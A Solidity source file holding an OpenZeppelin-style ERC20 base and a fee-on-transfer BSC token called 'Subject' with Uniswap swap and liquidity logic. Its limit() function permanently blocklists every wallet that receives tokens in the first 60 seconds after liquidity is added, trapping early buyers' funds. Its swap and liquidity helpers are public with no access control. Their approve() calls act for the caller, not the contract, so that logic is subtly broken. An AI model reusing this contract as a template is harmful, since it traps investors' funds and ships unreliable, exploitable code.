// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.9.0) (token/ERC20/ERC20.sol)

pragma solidity ^0.8.0;

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
            // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by
            // decrementing then incrementing.
            _balances[to] += amount;
        }

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        unchecked {
            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }


    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            // Overflow not possible: amount <= accountBalance <= totalSupply.
            _totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}
    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}
}

contract Subject is ERC20{

    receive() external payable {}
    
    address public uniswapV2Pair;
    address public uniswapV2Router;
    address public owner;

    address public marketking;

    address public reflow;

    address dead;

    mapping(address => bool) public blocklimit;
    uint256 public permitTime;

    uint256 public marketkingSurplus;
    uint256 public reflowSurplus;

    //0x10ED43C718714eb63d5aA57B78B54704E256024E
    //0x1e6470e6538E2A1BB02655Cd62195c6FbebdEBb4
    constructor(address _uniswapV2Router,address _marketking,address _reflow)ERC20("Subject 3","Subject"){
        _mint(msg.sender, 150000000e18);
        uniswapV2Router = _uniswapV2Router;
        marketking = _marketking;
        reflow = _reflow;
        owner = msg.sender;
        dead = 0x000000000000000000000000000000000000dEaD;
        uniswapV2Pair = IUniswapV2Factory(IUniswapV2Router(uniswapV2Router).factory()).createPair(
            IUniswapV2Router(uniswapV2Router).WETH(),
            address(this)
        );
    }

    modifier onlyOwner() {
        require(owner == msg.sender,"ERC20:Caller is not owner!");
        _;
    }

    function setOwner(address _owner) external onlyOwner(){
        owner = _owner;
    }

    function setInfo(address _marketking,address _reflow) external onlyOwner(){
        marketking = _marketking;
        reflow = _reflow;
    }

    function _transfer(address from, address to, uint256 amount) internal virtual override{
        require(!blocklimit[from],"ERC20:No permit!");
        uint256 tokenAmount = amount;
        if(from == uniswapV2Pair || to == uniswapV2Pair){
            super._transfer(from, address(this), tokenAmount * 4 / 100);
            super._transfer(from, dead, tokenAmount * 2 / 100);
            tokenAmount -= (tokenAmount * 6 / 100);
            reflowSurplus += amount * 2 / 100;
            marketkingSurplus += amount * 2 / 100;
        }
        super._transfer(from, to, tokenAmount);
        limit(to);
        if(from != uniswapV2Pair && from != uniswapV2Router && to != uniswapV2Pair && to != uniswapV2Router) _run();
    }

    function _run() public  {
      
        if (IERC20(uniswapV2Pair).totalSupply() > 0) {
            uint256 reflowHalf = reflowSurplus / 2;
            uint256 marketkingAmount = marketkingSurplus;
            
            // Swap half of reflowSurplus to BNB
            _swapToBNB(reflowHalf, address(this));
            
            // Add liquidity with the swapped BNB and remaining reflowSurplus
            _addLuidity(reflowHalf, address(this).balance, reflow);
            
            // Reset reflowSurplus
            reflowSurplus -= reflowHalf * 2;

            // Swap marketkingSurplus to BNB
            _swapToBNB(marketkingAmount, marketking);

            // Reset marketkingSurplus
            marketkingSurplus -= marketkingAmount;
        }
    
    } 


    function limit(address to) internal{
        if(permitTime == 0 && IERC20(uniswapV2Pair).totalSupply()>0) permitTime = block.timestamp;
        if(block.timestamp < permitTime + 60 && permitTime > 0 && to != address(this)) blocklimit[to] = true;
    }

    function _swapToBNB(uint256 amount, address to) public{
        approve(uniswapV2Router, amount);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = IUniswapV2Router(uniswapV2Router).WETH();

        IUniswapV2Router(uniswapV2Router).swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0, 
            path, 
            to, 
            block.timestamp
        );
    }

    function _addLuidity(uint256 amountToken, uint256 amountBNB, address to) public{
        approve(uniswapV2Router, amountToken);
        IUniswapV2Router(uniswapV2Router).addLiquidityETH{value:amountBNB}(
            address(this), 
            amountToken, 
            0, 
            0, 
            to, 
            block.timestamp
        );
    }

}